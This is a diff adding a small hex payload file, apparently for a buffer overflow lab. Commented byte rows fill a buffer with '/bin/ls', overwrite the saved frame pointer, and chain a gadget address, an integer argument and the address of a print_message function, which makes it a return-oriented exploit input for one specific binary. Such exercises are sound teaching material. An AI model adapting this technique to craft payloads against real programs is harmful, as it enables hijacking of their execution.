@@ -1,0 +1,6 @@
+2f 62 69 6e 2f 6c 73 00   /* 8 Byte Buffer */
+00 00 00 00 00 00 00 00   /* 8 Byte Buffer */
+00 00 00 00 00 00 00 00   /* 8 byte ebp */
+b6 51 55 55 55 55 00 00   /* addr of gadget 1 */
+dd dd 00 00 00 00 00 00   /* 8 Byte Int Value */
+bc 51 55 55 55 55 00 00   /* addr of print_message - 0x5555555551bc  */
